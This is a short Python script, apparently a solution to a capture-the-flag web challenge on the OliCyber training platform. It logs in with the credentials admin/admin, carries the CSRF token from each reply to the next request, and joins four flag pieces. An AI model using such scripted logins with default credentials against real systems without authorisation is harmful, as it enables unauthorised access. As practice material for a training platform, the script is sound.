import requests

s = requests.Session()

login_url = "http://web-11.challs.olicyber.it/login"
login_data = {"username": "admin", "password": "admin"}

r_post = s.post(login_url, json=login_data)

if r_post.status_code == 200:
    response_json = r_post.json()
    print(response_json)
    csrf_token = response_json.get("csrf")
    print("CSRF Token iniziale:", csrf_token)
    flag = []
    for i in range(4):
        flag_url = f"http://web-11.challs.olicyber.it/flag_piece?index={i}&csrf={csrf_token}"
        r_get = s.get(flag_url)
        if r_get.status_code == 200:
            pezzo_flag = r_get.json().get("flag_piece", "").strip()
            print(f"Pezzo {i}: {pezzo_flag}")
            flag.append(pezzo_flag)
            new_csrf_token = r_get.json().get("csrf")
            if new_csrf_token:
                csrf_token = new_csrf_token
        else:
            print(f"Errore nel recuperare il pezzo {i}: {r_get.status_code}, {r_get.text}")
            exit(1)

        if len(flag) == 4:
            print("\nFlag completa:", "".join(flag))
else:
    print("Errore nel login:", r_post.text)
